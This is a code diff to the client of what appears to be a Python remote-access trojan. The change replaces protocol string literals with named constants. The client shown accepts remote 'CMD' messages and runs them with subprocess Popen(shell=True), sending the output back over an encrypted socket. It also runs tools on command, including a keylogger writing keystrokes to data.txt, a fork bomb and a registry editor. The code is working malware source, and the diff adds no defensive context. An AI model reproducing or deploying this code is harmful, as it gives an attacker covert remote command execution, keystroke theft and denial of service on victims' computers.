@@ -7,7 +7,7 @@ import queue
 import tools.regedit as regedit
 import tools.forkbomb as forkbomb
 from tools.packet_manager import p_manager
-from tools.dictionary import SEND_DELAY
+from tools.dictionary import *
 from tools.utils import packet_send, packet_recv
 
 class client:
@@ -29,11 +29,11 @@ class client:
                                     conn=conn,
                                     decrypt=True)
 
-                if packet["CMD"] != "SRT":
+                if packet[PK_COMMAND_FLAG] != COMMAND_START:
                     continue
 
-                password = packet["PLD"]
-                sent = packet_send(command="ACK",
+                password = packet[PK_PAYLOAD_FLAG]
+                sent = packet_send(command=COMMAND_ACKNOWLEDGE,
                             payload=password,
                             cipherClass=self.cipherClass,
                             conn=conn,
@@ -45,14 +45,14 @@ class client:
         print("Handshake complete...")
 
     def exe_tool(self, message):
-        command = message["PLD"].lower()
-        return_message = {"CMD":'', "PLD":''}
+        command = message[PK_PAYLOAD_FLAG].lower()
+        return_message = {PK_COMMAND_FLAG:'', PK_PAYLOAD_FLAG:''}
 
         if command == "keylogger":
             keylogger.keylogger("data.txt")
 
-            return_message["CMD"] = "RSP"
-            return_message["PLD"] = "Keylogger Activated."
+            return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
+            return_message[PK_PAYLOAD_FLAG] = "Keylogger Activated."
 
             self.send_list.put(return_message)
             return
@@ -63,8 +63,8 @@ class client:
             else:
                 reply = "Failed!"
 
-            return_message["CMD"] = "RSP"
-            return_message["PLD"] = reply
+            return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
+            return_message[PK_PAYLOAD_FLAG] = reply
             self.send_list.put(return_message)
             return
 
@@ -74,8 +74,8 @@ class client:
             else:
                 reply = "Failed!"
 
-            return_message["CMD"] = "RSP"
-            return_message["PLD"] = reply
+            return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
+            return_message[PK_PAYLOAD_FLAG] = reply
             self.send_list.put(return_message)
             return
         elif command == "forkbomb":
@@ -90,20 +90,20 @@ class client:
             print("WARNING!, passed a weird output")
             return
 
-        return_message={"CMD":'', "PLD":''}
+        return_message={PK_COMMAND_FLAG:'', PK_PAYLOAD_FLAG:''}
 
-        if message["CMD"] == "CMD":
+        if message[PK_COMMAND_FLAG] == COMMAND_LINE_EXE:
             try:
                 self.command_list.put(message)
             except:
-                return_message["CMD"] = "ERR"
-                return_message["PLD"] = "Error in inputting the command."
+                return_message[PK_COMMAND_FLAG] = COMMAND_ERROR
+                return_message[PK_PAYLOAD_FLAG] = "Error in inputting the command."
                 self.send_list.put(return_message)
-        elif message["CMD"] == "EXE":
+        elif message[PK_COMMAND_FLAG] == COMMAND_TOOL_EXE:
             self.exe_tool(message)
-        elif message["CMD"] == "HLP":
-            return_message["CMD"] = "RSP"
-            return_message["PLD"] = """
+        elif message[PK_COMMAND_FLAG] == "HLP":
+            return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
+            return_message[PK_PAYLOAD_FLAG] = """
     Current list of commands implemented:
         CMD :param:     - enter command line commands
         EXE :param:     - execute created tools
@@ -114,15 +114,15 @@ class client:
             """
             self.send_list.put(return_message)
         else:
-            return_message["CMD"] = "RSP"
-            return_message["PLD"] = "Unknown command. Type HLP to get Help"
+            return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
+            return_message[PK_PAYLOAD_FLAG] = "Unknown command. Type HLP to get Help"
             self.send_list.put(return_message)
         return
 
 
 
     def execute_commands(self):
-        return_message = {"CMD":'RSP', "PLD":''}
+        return_message = {PK_COMMAND_FLAG:COMMAND_RESPONSE, PK_PAYLOAD_FLAG:''}
 
         while(not(self.stop)):
             try:
@@ -131,7 +131,7 @@ class client:
                 #Reads the command_list pipe, needs to obtain thread lock
                 if (not(self.command_list.empty())):
                     command = self.command_list.get()
-                    command = command["PLD"]
+                    command = command[PK_PAYLOAD_FLAG]
                 if(command != None):
                     response = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                     data = response.stdout.read() + response.stderr.read()
@@ -140,10 +140,10 @@ class client:
                         data = str(data.decode('utf-8'))
                     except:
                         data = data.hex()
-                    return_message["PLD"] = data
+                    return_message[PK_PAYLOAD_FLAG] = data
                     self.send_list.put(return_message)
                     # Allocate new dict for the return_message
-                    return_message = {"CMD":'RSP', "PLD":''}
+                    return_message = {PK_COMMAND_FLAG:COMMAND_RESPONSE, PK_PAYLOAD_FLAG:''}
             except:
                 print("ERROR IN EXECUTE_COMMANDS FUNCTION")
                 self.stop = True
@@ -168,8 +168,8 @@ class client:
             try:
                 if not(self.send_list.empty()):
                     message = self.send_list.get()
-                    packet_send(command=message["CMD"],
-                                payload=message["PLD"],
+                    packet_send(command=message[PK_COMMAND_FLAG],
+                                payload=message[PK_PAYLOAD_FLAG],
                                 cipherClass=self.cipherClass,
                                 conn=self.sock,
                                 encrypt=True)
